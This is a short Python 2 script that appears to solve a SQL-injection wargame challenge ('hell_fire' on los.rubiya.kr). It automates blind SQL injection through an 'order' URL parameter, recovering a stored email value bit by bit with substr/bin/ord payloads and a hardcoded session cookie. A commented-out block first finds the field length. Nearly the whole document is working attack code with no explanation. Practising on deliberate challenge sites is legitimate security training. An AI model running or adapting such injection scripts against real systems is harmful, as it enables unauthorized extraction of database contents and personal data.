#!/usr/bin/python
#-*-coding:utf-8  -*-

#length = 18
#<td>rubiya</td>
#<td>admin</td> 
#Blind SQL Injection 문자 찾기!!

import urllib,urllib2,requests


password=""
guestword=""
heex = "/012345678`abcde"
chars="!@#$%^&*()[]-_=+<>/1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
tf="01"

'''
for k in range(1,100):
	url="https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?order=(select%20score%20where%20id=%27rubiya%27%20or%20length(email)="+str(k)+") limit 1"
	r = requests.post(url,cookies=(dict(PHPSESSID="l8hfib02h6gjbk4ppj82hbbbr3")))
	print "Finding length of password : "+str(k)	
	if '<td>rubiya</td>' in r.text:
		print "length is : " + str(k)
		length = k
		break
'''
k=28

for j in range(1,k+1):
	binpassword = ""
	for six in range(1,9):
		for i in tf:
			url="https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?order=(select%20score%20where%20id=%27rubiya%27%20or%20substr(lpad(bin(ord(substr(email,"+str(j)+",1))),8,0),"+str(six)+",1)="+str(i)+") limit 1"
			print url
			r = requests.post(url,cookies=(dict(PHPSESSID="l8hfib02h6gjbk4ppj82hbbbr3")))
			print "Finding password : "+ str(i)	
			if '<td>rubiya</td>' in r.text:
				binpassword += str(i)
				print "password is : " + binpassword
				break
	print "A bit word is " + binpassword
	print "ascii of this is " + chr(int('0b'+binpassword,2))
	password += chr(int('0b'+binpassword,2))
	print "Email is " + password	

